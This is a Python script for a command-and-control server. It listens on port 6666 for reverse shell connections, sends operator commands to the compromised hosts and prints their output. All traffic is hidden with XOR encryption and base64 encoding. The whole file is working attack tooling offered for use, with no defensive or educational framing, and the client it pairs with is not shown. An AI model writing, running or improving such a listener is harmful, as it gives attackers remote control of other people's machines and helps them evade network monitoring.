#!/usr/bin/env python3
"""
Encrypted TCP C2 - Port 6666
Handles XOR-encrypted shell traffic
"""
import socket
import base64
import threading
from datetime import datetime

PORT = 6666
KEY = bytes([0x41, 0x42, 0x43, 0x44])  # Must match client

def xor_crypt(data: bytes) -> bytes:
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def encrypt(text: str) -> str:
    return base64.b64encode(xor_crypt(text.encode())).decode()

def decrypt(text: str) -> str:
    return xor_crypt(base64.b64decode(text)).decode()

def handle_client(conn, addr):
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Connection from {addr[0]}:{addr[1]}")
    try:
        # Receive banner
        banner_enc = conn.recv(4096).decode().strip()
        banner = decrypt(banner_enc)
        print(f"[+] {banner}")

        while True:
            # Receive prompt
            prompt_enc = conn.recv(1024).decode().strip()
            if not prompt_enc:
                break

            # Get command from user
            cmd = input(f"enc-shell ({addr[0]})> ").strip()
            if not cmd:
                cmd = "echo ."

            # Send encrypted command
            conn.send((encrypt(cmd) + "\n").encode())

            if cmd == "exit":
                break

            # Receive encrypted output
            output_enc = conn.recv(65536).decode().strip()
            if output_enc:
                print(decrypt(output_enc))

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()
        print(f"[*] Session closed: {addr[0]}")

def main():
    print(f"""
╔═══════════════════════════════════════════╗
║      ENCRYPTED TCP C2 - Port {PORT}         ║
║      XOR Key: {KEY.hex()}                   ║
╚═══════════════════════════════════════════╝
[*] Waiting for connections...
""")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PORT))
    server.listen(5)

    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            break

if __name__ == "__main__":
    main()
